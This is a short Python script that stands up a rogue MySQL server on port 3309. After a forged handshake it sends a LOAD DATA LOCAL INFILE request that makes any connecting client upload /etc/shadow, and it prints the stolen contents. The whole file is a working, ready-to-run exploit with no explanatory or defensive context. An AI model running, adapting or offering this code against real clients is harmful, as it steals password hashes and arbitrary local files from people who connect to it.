# -*- coding:utf-8 -*-
import socket
import binascii
import os



def receive_data(conn):
    data = conn.recv(1024)
    #print("[*] Receiveing the package : {}".format(data))
    return data

def send_data(conn,data):
    #print("[*] Sending the package : {}".format(data))
    conn.send(binascii.a2b_hex(data))




def run():

    while 1:
        conn, addr = sk.accept()
        print("Connection come from {}:{}".format(addr[0],addr[1]))

        
        b="5b0000000a352e362e32382d307562756e7475302e31342e30342e31002d000000403f59264b2b346000fff70802007f8015000000000000000000006869595f525f635560645352006d7973716c5f6e61746976655f70617373776f726400"
        send_data(conn,b)
        data=receive_data(conn)
        b="0700000200000002000000"
        send_data(conn,b)
        data=receive_data(conn)
        filename=b"/etc/shadow"
        wantfile = chr(len(filename) + 1).encode() + b"\x00\x00\x01\xFB" + filename
        #b="0c000001fb2f6574632f706173737764"
        #send_data(conn,b)
        #print(wantfile)
        conn.send(wantfile)
        data=receive_data(conn)
        print(data)
        b="0700000400000002000000"
        send_data(conn,b)
        data=receive_data(conn)
            


if __name__ == '__main__':
    HOST ='0.0.0.0'
    PORT = 3309
    sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    sk.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sk.bind((HOST, PORT))
    sk.listen(1)

    print("start fake mysql server listening on {}:{}".format(HOST,PORT))
    run()